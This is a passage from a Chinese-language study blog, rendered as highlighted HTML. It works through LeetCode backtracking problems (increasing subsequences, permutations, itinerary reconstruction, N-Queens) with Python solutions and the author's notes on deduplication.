punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                dfs<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>                path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="491递增子序列"><a class="markdownIt-Anchor" href="#491递增子序列"></a> 491.递增子序列</h3><p>给你一个整数数组 <code>nums</code> ，找出并返回所有该数组中不同的递增子序列，递增子序列中 <strong>至少有两个元素</strong> 。你可以按 <strong>任意顺序</strong> 返回答案。</p><p>数组中可能含有重复元素，如出现两个整数相等，也可以视作递增序列的一种特殊情况。</p><h4 id="思路-10"><a class="markdownIt-Anchor" href="#思路-10"></a> 思路</h4><p>一个递增子序列 path 怎么产生？它的元素是从 nums 中一个个选的。<br />比如 [4,2,7,7]，path 选第一个数，有 4 种选择：从nums[0]到nums[3]。<br />选了nums[i]之后，会在nums[i+1]到末尾的数中，再选下一个……<br />以此类推，直到没得选为止。当 path 满足要求，就可以加入解集，这是递归回溯的思路。</p><p>定义递归函数：在从下标 start 到末尾的子数组中选合适的数推入 path。path 也作为参数。在递归过程中，不断选数字入 path。</p><p>递归函数中，通过 for 循环枚举出当前的所有选择——（展开不同的递归分支）。</p><p>选择了一个数，推入 path，往下继续选择（继续递归）。</p><p>当 start 指针到达边界，能选的都选了，没有数字可选了，结束递归。</p><p>基于当前选择的递归，已经考察了所有可能，这时会回溯，path 要撤销最末尾的数字，切入别的分支。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">findSubsequences</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#由于返回的是该数组中不同的递增子序列，并且递增子序列中至少有两个元素，需要进行树层去重</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">>=</span><span class="token number">2</span><span class="token punctuation">:</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token comment">#这里不要取return，要取树上的节点</span>            uset<span class="token operator">=</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> path <span class="token keyword">and</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span>path<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">or</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">in</span> uset<span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                uset<span class="token punctuation">.</span>add<span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#记录这个元素在本层中已经用过了</span>                dfs<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>path<span class="token punctuation">)</span>                path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="排列问题"><a class="markdownIt-Anchor" href="#排列问题"></a> 排列问题</h2><h3 id="46-全排列"><a class="markdownIt-Anchor" href="#46-全排列"></a> <a href="https://leetcode.cn/problems/permutations/">46. 全排列</a></h3><p>给定一个不含重复数字的数组 <code>nums</code> ，返回其 <em>所有可能的全排列</em> 。你可以 <strong>按任意顺序</strong> 返回答案。</p><h4 id="思路-11"><a class="markdownIt-Anchor" href="#思路-11"></a> 思路</h4><p>抽象为树，每次都是从0开始遍历</p><p>这题的主要考点就是进行树枝去重</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">permute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        used<span class="token operator">=</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> used<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token comment">#进行树枝去重</span>                    <span class="token keyword">continue</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                used<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">True</span>                  dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>path<span class="token punctuation">)</span>                used<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span>                path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="47-全排列-ii"><a class="markdownIt-Anchor" href="#47-全排列-ii"></a> <a href="https://leetcode.cn/problems/permutations-ii/">47. 全排列 II</a></h3><p>给定一个可包含重复数字的序列 <code>nums</code> ，<em><strong>按任意顺序</strong></em> 返回所有不重复的全排列。</p><h4 id="思路-12"><a class="markdownIt-Anchor" href="#思路-12"></a> 思路</h4><p>与上题类似，把树枝去重改成树层去重即可</p><p>树层去重有两种方法：1.采用used数组记录状态2.先排序，利用双指针进行去重</p><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">permuteUnique</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        used<span class="token operator">=</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>        nums<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> used<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">or</span> used<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token comment">#进行树层去重,还要进行树枝去重</span>                    <span class="token keyword">continue</span>                used<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">True</span>                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>path<span class="token punctuation">)</span>                used<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span>                path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码去重的关键在与</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>nums<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> used<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">or</span> used<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token triple-quoted-string string">'''进行详细解释:nums[i]==nums[i-1] 代表着树层去重or used[i] 是进行树枝去重而and used[i-1] 或者说可以写出 and not used[i+1]条件 not used[i-1] 的目的是确保算法在处理输入数组 nums 中的重复元素时不会跳过考虑某个递归树的特定分支。让我们在代码上下文中详细解释这个条件的目的：在同一层次的重复检查（树的分支）：条件 (i > 0 and nums[i]==nums[i-1] and not used[i-1]) 检查在同一层次（在递归树的同一分支中）是否存在重复元素。如果 nums[i] 与 nums[i-1] 相同（重复元素），且 used[i-1] 为 False（表示在当前分支中前一个元素未被使用），则跳过该分支以避免生成重复的排列。示例：考虑输入数组 nums = [1, 1, 2]。如果没有条件 not used[i-1]，算法可能会生成重复的排列，比如 [1, 1, 2]，因为第一个 1 可以选择在位置 0 或 1。该条件通过确保仅在第一次出现的 1 已被使用时考虑第二次出现的 1，从而防止了这种情况。总体重复避免策略：整个条件 (i > 0 and nums[i]==nums[i-1] and not used[i-1]) 是处理在递归树的同一层次（同一分支）和不同层次（不同分支）上的重复元素的策略的一部分。used 数组跟踪在特定层次使用的元素，该条件有助于跳过某些分支，以避免生成重复的排列。'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="332-重新安排行程"><a class="markdownIt-Anchor" href="#332-重新安排行程"></a> <a href="https://leetcode.cn/problems/reconstruct-itinerary/">332. 重新安排行程</a></h3><p>给你一份航线列表 <code>tickets</code> ，其中 <code>tickets[i] = [fromi, toi]</code> 表示飞机出发和降落的机场地点。请你对该行程进行重新规划排序。</p><p>所有这些机票都属于一个从 <code>JFK</code>（肯尼迪国际机场）出发的先生，所以该行程必须从 <code>JFK</code> 开始。如果存在多种有效的行程，请你按字典排序返回最小的行程组合。</p><ul><li>例如，行程 <code>[&quot;JFK&quot;, &quot;LGA&quot;]</code> 与 <code>[&quot;JFK&quot;, &quot;LGB&quot;]</code> 相比就更小，排序更靠前。</li></ul><p>假定所有机票至少存在一种合理的行程。且所有的机票 必须都用一次 且 只能用一次。</p><h4 id="思路-13"><a class="markdownIt-Anchor" href="#思路-13"></a> 思路</h4><pre><code>    # 核心思想--深度搜索+回溯    # 首先先把图的邻接表存进字典，然后对字典的value进行排序    # 然后从'JFK'开始深搜，每前进一层就减去一条路径，    # 直到某个节点不存通往其他节点的路径时，说明该节点就为此次行程的终点    # 需要跳出while循环进行回溯，返回到上一层节点进行搜索，再次找到倒数第二个终点，依次类推    # 设定ans为返回答案，每次找到的节点都要往头部插入    # 举例说明：[[&quot;JFK&quot;,&quot;SFO&quot;],[&quot;JFK&quot;,&quot;ATL&quot;],[&quot;SFO&quot;,&quot;ATL&quot;],[&quot;ATL&quot;,&quot;JFK&quot;],[&quot;ATL&quot;,&quot;SFO&quot;]]    # 构建领接表的字典：&#123;'JFK': ['SFO', 'ATL'], 'SFO': ['ATL'], 'ATL': ['JFK', 'SFO']&#125;)    # 按照题目要求对字典的val排序：&#123;'JFK': ['ATL', 'SFO'], 'SFO': ['ATL'], 'ATL': ['JFK', 'SFO']&#125;)    # 开始从 JFL 开始进行dfs搜索    # 1.JFK --&gt; ALT      #   JFK pop出ALT,JFK的字典变为：'JFK': ['SFO']    # 2.JFK --&gt; ALT --&gt; JFK     #   ALT pop出JFK,ALT的字典变为：'ALT': ['SFO']    # 3.JFK --&gt; ALT --&gt; JFK --&gt; SFO     #   JFK pop出SFO,JFK的字典变为：'JFK': ['']    # 4.JFK --&gt; ALT --&gt; JFK --&gt; SFO --&gt; ATL     #   SFO pop出ALT,SFO的字典变为：'SFO': ['']    # 5.JFK --&gt; ALT --&gt; JFK --&gt; SFO --&gt; ATL --&gt; SFO    #   ATL pop出SFO,ATL的字典变为：'ATL': ['']    # 此时我们可以发现SFO的val为空，没有地方可以去了，说明我们已经找出了终点SFO    # 然后向上回溯，依次将其添加到ans中    # 最终答案为：[&quot;JFK&quot;,&quot;ATL&quot;,&quot;JFK&quot;,&quot;SFO&quot;,&quot;ATL&quot;,&quot;SFO&quot;]</code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> collections<span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">findItinerary</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> tickets<span class="token punctuation">:</span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> collections<span class="token punctuation">.</span>defaultdict<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>   <span class="token comment">#邻接表</span>        <span class="token keyword">for</span> f<span class="token punctuation">,</span> t <span class="token keyword">in</span> tickets<span class="token punctuation">:</span>            d<span class="token punctuation">[</span>f<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token punctuation">[</span>t<span class="token punctuation">]</span>  <span class="token comment"># 路径存进邻接表</span>        <span class="token keyword">for</span> f <span class="token keyword">in</span> d<span class="token punctuation">:</span>            d<span class="token punctuation">[</span>f<span class="token punctuation">]</span><span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 邻接表排序</span>        ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 深搜函数</span>            <span class="token keyword">while</span> d<span class="token punctuation">[</span>f<span class="token punctuation">]</span><span class="token punctuation">:</span>                dfs<span class="token punctuation">(</span>d<span class="token punctuation">[</span>f<span class="token punctuation">]</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 路径检索            </span>            ans<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span>  <span class="token comment"># 放在最前</span>        dfs<span class="token punctuation">(</span><span class="token string">'JFK'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> ans<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="棋盘问题"><a class="markdownIt-Anchor" href="#棋盘问题"></a> 棋盘问题</h2><h3 id="51-n-皇后"><a class="markdownIt-Anchor" href="#51-n-皇后"></a> <a href="https://leetcode.cn/problems/n-queens/">51. N 皇后</a></h3><p>按照国际象棋的规则，皇后可以攻击与之处在同一行或同一列或同一斜线上的棋子。</p><p><strong>n 皇后问题</strong> 研究的是如何将 <code>n</code> 个皇后放置在 <code>n×n</code> 的棋盘上，并且使皇后彼此之间不能相互攻击。</p><p>给你一个整数 <code>n</code> ，返回所有不同的 <strong>n 皇后问题</strong> 的解决方案。</p><p>每一种解法包含一个不同的 <strong>n 皇后问题</strong> 的棋子放置方案，该方案中 <code>'Q'</code> 和 <code>'.'</code> 分别代表了皇后和空位。</p><h4 id="思路-14"><a class="markdownIt-Anchor" href="#思路-14"></a> 思路</h4><p>rows相当于index，相当与树的递归深度，而cols在每一层遍历，回溯每次下的Q即可，手搓一个dfs</p><p>虽然速度只打败百分17的人，算法还需要优化，不过第一次手撕出来，还是有点高兴的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">solveNQueens</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment">#初始化一个棋盘</span>        board<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'.'</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment">#进行dfs</span>        <span class="token comment">#index == rows</span>        <span class="token keyword">def</span> <span class="token function">islegal</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>cols<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#理论上cols不可能冲突</span>            <span class="token comment">#检测rows冲突</span>            <span class="token keyword">if</span> index <span class="token operator">>=</span><span class="token number">0</span> <span class="token keyword">and</span> cols <span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> i<span class="token operator">>=</span><span class="token number">0</span> <span class="token keyword">and</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>cols<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'Q'</span><span class="token punctuation">:</span>                        <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token comment">#检测左上是否冲突</span>                <span class="token keyword">for</span> i<span class="token punctuation">,</span>j <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>cols<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 修改这一行</span>                    <span class="token keyword">if</span> i<span class="token operator">>=</span><span class="token number">0</span> <span class="token keyword">and</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'Q'</span><span class="token punctuation">:</span>                        <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token comment">#检测右上是否冲突</span>                <span class="token keyword">for</span> i<span class="token punctuation">,</span>j <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>cols<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 修改这一行</span>                    <span class="token keyword">if</span> i<span class="token operator">>=</span><span class="token number">0</span> <span class="token keyword">and</span> board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'Q'</span><span class="token punctuation">:</span>                        <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> index <span class="token operator">==</span> n<span class="token punctuation">:</span>                path<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                    path<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">for</span> cols <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> islegal<span class="token punctuation">(</span>index<span class="token punctuation">,</span>cols<span class="token punctuation">)</span><span class="token punctuation">:</span>                    board<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>cols<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'Q'</span>                    dfs<span class="token punctuation">(</span>index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>                    board<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>cols<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'.'</span>        dfs<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>优化的思路</p><ul><li>可以用一个一维数组来存储每一行皇后的列位置，而不是用一个二维数组来表示整个棋盘。这样可以节省空间，也可以简化判断是否合法的逻辑。</li><li>可以用位运算来加速判断是否合法的过程。具体地，你可以用三个整数来分别记录每一列，每一条主对角线，和每一条副对角线上是否已经有皇后。每次放置一个皇后时，你只需要检查当前位置的列，主对角线，和副对角线是否为 0，如果是，说明可以放置，然后更新这三个整数的相应位为 1。这样可以避免使用循环和数组索引，提高效率</li><li>可以用一个全局变量来记录最终的结果，而不是作为参数传递。这样可以避免不必要的拷贝，也可以简化函数的参数列表。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">solveNQueens</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token 